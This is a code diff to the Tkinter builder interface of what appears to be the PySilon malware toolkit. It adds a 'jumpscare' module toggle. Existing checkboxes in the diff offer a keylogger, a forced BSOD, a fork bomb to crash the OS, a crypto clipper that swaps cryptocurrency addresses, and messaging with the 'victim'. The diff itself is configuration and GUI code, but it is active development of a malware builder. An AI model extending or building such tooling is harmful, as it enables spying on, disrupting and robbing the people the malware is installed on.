@@ -37,7 +37,8 @@ filenames = {
     'txtspee': 'texttospeech.py',
     'audctrl': 'audio_control.py',
     'monctrl': 'monitor_control.py',
-    'webbloc': 'website_blocker.py'
+    'webbloc': 'website_blocker.py',
+    'jmpscar': 'jumpscare.py'
 }
 
 default_modules = [
@@ -104,6 +105,7 @@ def load_configuration(is_custom):
     cbvar_audctrl.set(config['FUNCTIONALITY']['audctrl'])
     cbvar_monctrl.set(config['FUNCTIONALITY']['monctrl'])
     cbvar_webbloc.set(config['FUNCTIONALITY']['webbloc'])
+    cbvar_jmpscar.set(config['FUNCTIONALITY']['jmpscar'])
 
 def recommended_configuration():
     cbvar_keylogger.set(False)
@@ -129,6 +131,7 @@ def recommended_configuration():
     cbvar_audctrl.set(True)
     cbvar_monctrl.set(True)
     cbvar_webbloc.set(True)
+    cbvar_jmpscar.set(False)
     cbvar_custom_icon.set(True)
 
 def reset_configuration():
@@ -163,6 +166,7 @@ def reset_configuration():
     cbvar_audctrl.set(True)
     cbvar_monctrl.set(True)
     cbvar_webbloc.set(True)
+    cbvar_jmpscar.set(True)
     cbvar_custom_icon.set(True)
     cbvar_disclaimer.set(False)
 
@@ -214,6 +218,7 @@ def save_configuration():
     config['FUNCTIONALITY']['audctrl'] = str(cbvar_audctrl.get())
     config['FUNCTIONALITY']['monctrl'] = str(cbvar_monctrl.get())
     config['FUNCTIONALITY']['webbloc'] = str(cbvar_webbloc.get())
+    config['FUNCTIONALITY']['jmpscar'] = str(cbvar_jmpscar.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -369,7 +374,7 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('750x805')
+    root.geometry('750x830')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
     root.title('PySilon Builder')
@@ -463,6 +468,7 @@ else:
     cbvar_audctrl = BooleanVar(value=True)
     cbvar_monctrl = BooleanVar(value=True)
     cbvar_webbloc = BooleanVar(value=True)
+    cbvar_jmpscar = BooleanVar(value=True)
 
     def open_crypto_clipper_config():
         json_file_path = 'resources/crypto_clipper.json'
@@ -487,11 +493,12 @@ else:
     cb_bluesod = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='trigger a bsod', variable=cbvar_bluesod, command=config_modification, onvalue=True, offvalue=False)
     cb_forkbmb = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='fork bomb (spam processes to crash os)', variable=cbvar_forkbmb, command=config_modification, onvalue=True, offvalue=False)
     cb_crclipr = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='crypto clipper (replaces crypto addresses)', variable=cbvar_crclipr, command=config_modification, onvalue=True, offvalue=False)
-    cd_txtspee = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='text to speech messages', variable=cbvar_txtspee, command=config_modification, onvalue=True, offvalue=False)
+    cb_txtspee = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='text to speech messages', variable=cbvar_txtspee, command=config_modification, onvalue=True, offvalue=False)
     cb_messger = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='messager with victim (messagebox)', variable=cbvar_messger, command=config_modification, onvalue=True, offvalue=False)
     cb_monctrl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='monitor control (turn on / off)', variable=cbvar_monctrl, command=config_modification, onvalue=True, offvalue=False)
     cb_audctrl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='volume control & mp3 player', variable=cbvar_audctrl, command=config_modification, onvalue=True, offvalue=False)
     cb_webbloc = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block websites', variable=cbvar_webbloc, command=config_modification, onvalue=True, offvalue=False)
+    cb_jmpscar = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='jumpscare', variable=cbvar_jmpscar, command=config_modification, onvalue=True, offvalue=False)
     json_button = Button(settings_canvas, text='⚙', command=open_crypto_clipper_config)
 
     cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
@@ -512,12 +519,13 @@ else:
     cb_bluesod.grid(row=18, column=2, sticky=W, padx=(30, 0))
     cb_forkbmb.grid(row=19, column=2, sticky=W, padx=(30, 0))
     cb_messger.grid(row=20, column=2, sticky=W, padx=(30, 0))
-    cd_txtspee.grid(row=21, column=2, sticky=W, padx=(30, 0))
+    cb_txtspee.grid(row=21, column=2, sticky=W, padx=(30, 0))
     cb_audctrl.grid(row=22, column=2, sticky=W, padx=(30, 0))
     cb_monctrl.grid(row=23, column=2, sticky=W, padx=(30, 0))
     cb_webbloc.grid(row=24, column=2, sticky=W, padx=(30, 0))
-    cb_crclipr.grid(row=25, column=2, sticky=W, padx=(30, 0), pady=(0, 10))
-    json_button.grid(row=25, column=2, padx=(190, 0), pady=(0, 10))
+    cb_jmpscar.grid(row=25, column=2, sticky=W, padx=(30, 0))
+    cb_crclipr.grid(row=26, column=2, sticky=W, padx=(30, 0), pady=(0, 10))
+    json_button.grid(row=26, column=2, padx=(190, 0), pady=(0, 10))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
